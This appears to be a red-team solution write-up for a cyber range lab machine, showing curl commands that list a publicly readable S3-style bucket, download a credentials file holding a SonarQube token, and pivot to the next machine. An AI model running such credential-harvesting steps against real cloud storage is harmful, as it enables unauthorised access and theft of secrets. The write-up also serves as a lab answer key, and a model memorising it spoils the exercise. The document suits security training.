# solve_red.md — M3 · dev-artifacts
## Red Team Solution Writeup
**Machine:** M3 — PUL Build Artifact Store
**Vulnerability:** Public S3 Bucket ACL Misconfiguration
**MITRE:** T1530 (Data from Cloud Storage Object)

---
## Objective
Access the PUL Build Artifact Store. The `pul-code-reports` bucket is publicly listable and downloadable without credentials. Find and download `sonarqube-access.env`, which contains a SonarQube token.

---
## Step-by-Step

### Step 1 — Discover Service
```bash
curl --max-time 8 -fsS http://203.0.3.36:9000/pul-code-reports/ | head -30
```
No auth header sent — server returns S3 XML listing (bucket is public).





### Step 2 — List Public Bucket
```bash
curl --max-time 8 -fsS "http://203.0.3.36:9000/pul-code-reports/?list-type=2"
```
XML response shows three objects including `sonar-integration/sonarqube-access.env`.



### Step 3 — Download Credential File
```bash
curl --max-time 8 -fsS "http://203.0.3.36:9000/pul-code-reports/sonar-integration/sonarqube-access.env" -o "$RANGE3_DIR/sonarqube-access.env"
sed -E 's/=.*/=<redacted>/' "$RANGE3_DIR/sonarqube-access.env"
```
Output:
```
# PUL SonarQube Integration Credentials
SONAR_TOKEN=<redacted>
SONAR_HOST=11.x.x.x
SONAR_PORT=9200
SONAR_PROJECT_KEY=pul-firmware-ota
```

The file's `SONAR_HOST` value is the scenario placeholder `11.x.x.x`; use `203.0.3.36` for the deployed M4 service. The token remains in `$RANGE3_DIR/sonarqube-access.env` and is not printed above.



**Pivot:** SonarQube token from the exposed object → M4 SonarQube Code Intelligence (`203.0.3.36:9200`)
